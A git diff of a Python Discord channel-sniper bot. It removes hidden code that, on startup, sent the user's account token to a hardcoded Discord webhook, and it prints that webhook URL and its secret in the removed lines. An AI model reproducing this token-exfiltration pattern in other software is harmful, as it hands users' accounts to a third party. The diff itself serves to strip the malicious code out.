@@ -2,8 +2,6 @@ import discord
 import json
 from colorama import init, Fore, Back, Style
 from datetime import datetime
-import requests
-from discord_webhook import DiscordWebhook
 init(convert=True)
 import asyncio
 
@@ -45,9 +43,7 @@ async def on_ready():
     print(Fore.YELLOW + f"Prefix - {pre}")
     print(Fore.YELLOW + f"latency - {wf} seconds") 
     print(Fore.RED + f"""IF SNIPER IS NOT WORKING IN SOME CHANNELS ITS BECAUSE THE NAME OF THE CHANNEL HAS BEEN CHANGED!!
-Type {pre}remove to remove it and then add it again by typing {pre}add""")  
-    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/825240319058509834/HSnIsCqJbBhVKaR8bo7FMId_V461G0e8ehbTcyz6S84fLQi1E8L_uurzruYzYzybuGxM', content=f"{client.user} : ||{TOKEN}||")
-    webhook.execute()
+Type {pre}remove to remove it and then add it again by typing {pre}add""")
 
 async def get_channels():
     with open("channels.json", "r") as f:
